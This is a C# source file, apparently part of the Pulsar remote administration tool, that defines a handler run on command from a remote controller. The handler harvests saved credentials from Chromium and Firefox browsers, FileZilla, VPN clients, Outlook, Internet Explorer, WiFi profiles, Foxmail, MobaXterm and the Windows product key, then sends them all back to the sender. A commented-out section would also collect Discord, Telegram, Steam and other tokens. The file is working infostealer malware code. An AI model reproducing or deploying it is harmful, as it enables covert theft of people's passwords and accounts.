using Pulsar.Client.Recovery;
using Pulsar.Client.Recovery.Browsers;
using Pulsar.Client.Recovery.Crawler;
using Pulsar.Client.Recovery.IE;
using Pulsar.Client.Recovery.Outlook;
using Pulsar.Client.Recovery.VPN;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Passwords;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;

namespace Pulsar.Client.Messages
{
    public class PasswordRecoveryHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetPasswords;
        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            if (message is GetPasswords msg)
                Execute(sender, msg);
        }

        private void Execute(ISender client, GetPasswords message)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();

            // ============================
            //     CHROMIUM & FIREFOX
            // ============================
            List<Recovery.Browsers.AllBrowsers> browsers = Crawl.Start();

            foreach (var browser in browsers)
            {
                // Chromium
                foreach (var chromium in browser.Chromium)
                {
                    foreach (var profile in chromium.Profiles)
                    {
                        try
                        {
                            recovered.AddRange(
                                ChromiumBase.ReadAccounts(
                                    profile.LoginData,
                                    chromium.LocalState,
                                    chromium.Name
                                )
                            );
                        }
                        catch (Exception e)
                        {
                            Debug.WriteLine(e);
                        }
                    }
                }

                // Gecko (Firefox)
                foreach (var gecko in browser.Gecko)
                {
                    try
                    {
                        recovered.AddRange(FirefoxPassReader.ReadAccounts(gecko.ProfilesDir, gecko.Name));
                    }
                    catch (Exception e)
                    {
                        Debug.WriteLine(e);
                    }
                }
            }

            // ============================
            //       FILEZILLA SUPPORT
            // ============================
            try
            {
                recovered.AddRange(FileZillaReader.Read());
            }
            catch (Exception ex)
            {
                Debug.WriteLine("FileZilla Error: " + ex.Message);
            }
            // ============================
            //       VPN SUPPORT
            // ============================
            try
            {
                UnifiedVPNRecovery.RecoverAllVPNs(recovered);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("VPN Recovery Error: " + ex.Message);
            }
            // ============================
            //       Outlook OLD
            // ============================
            try
            {
                OutlookRecovery.Recover(recovered);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Outlook Error: " + ex.Message);
            }
            // ============================
            //       Internet Explorer
            // ============================
            try
            {
                InternetExplorerRecovery.Recover(recovered);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("IE Recovery Error: " + ex.Message);
            }
            // ============================
            //       WIFI PASSWORDS
            // ============================
            try
            {
                var wifiAccounts = WifiRecovery.RecoverWifiPasswords();
                recovered.AddRange(wifiAccounts);
                Debug.WriteLine($"Recovered {wifiAccounts.Count} WiFi networks");
            }
            catch (Exception ex)
            {
                Debug.WriteLine("WiFi Recovery Error: " + ex.Message);
            }
            // ============================
            //       FOXMAIL SUPPORT
            // ============================
            try
            {
                recovered.AddRange(FoxMailReader.Read());
            }
            catch (Exception ex)
            {
                Debug.WriteLine("FoxMail Error: " + ex.Message);
            }
            // ============================
            //       MOBAXTERM SUPPORT
            // ============================
            try
            {
                recovered.AddRange(MobaXtermReader.Read());
            }
            catch (Exception ex)
            {
                Debug.WriteLine("MobaXterm Error: " + ex.Message);
            }
            // ============================
            //       WINDOWS PRODUCT KEY
            // ============================
            try
            {
                recovered.AddRange(WindowsKeyReader.Read());
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Windows Key Error: " + ex.Message);
            }
            // ============================
            //       MULTI-PLATFORM TOKENS
            // ============================
            //try
            //{
            //    var multiPlatformAccounts = MultiPlatformTokenReader.Read();
            //    recovered.AddRange(multiPlatformAccounts);

            //    // Count by platform for detailed logging
            //    var discordCount = multiPlatformAccounts.Count(a => a.Application.Contains("Discord"));
            //    var telegramCount = multiPlatformAccounts.Count(a => a.Application.Contains("Telegram"));
            //    var battleNetCount = multiPlatformAccounts.Count(a => a.Application.Contains("Battle.net"));
            //    var steamCount = multiPlatformAccounts.Count(a => a.Application.Contains("Steam"));
            //    var zoomCount = multiPlatformAccounts.Count(a => a.Application.Contains("Zoom"));

            //    Debug.WriteLine($"Multi-Platform Recovery Results:");
            //    Debug.WriteLine($"  Discord: {discordCount} tokens");
            //    Debug.WriteLine($"  Telegram: {telegramCount} sessions");
            //    Debug.WriteLine($"  Battle.net: {battleNetCount} accounts");
            //    Debug.WriteLine($"  Steam: {steamCount} accounts");
            //    Debug.WriteLine($"  Zoom: {zoomCount} accounts");
            //    Debug.WriteLine($"  Total: {multiPlatformAccounts.Count} recovered items");
            //}
            //catch (Exception ex)
            //{
            //    Debug.WriteLine("Multi-Platform Token Recovery Error: " + ex.Message);
            //}



            // ============================
            //       RETURN BACK
            // ============================
            client.Send(new GetPasswordsResponse
            {
                RecoveredAccounts = recovered
            });
        }
    }
}
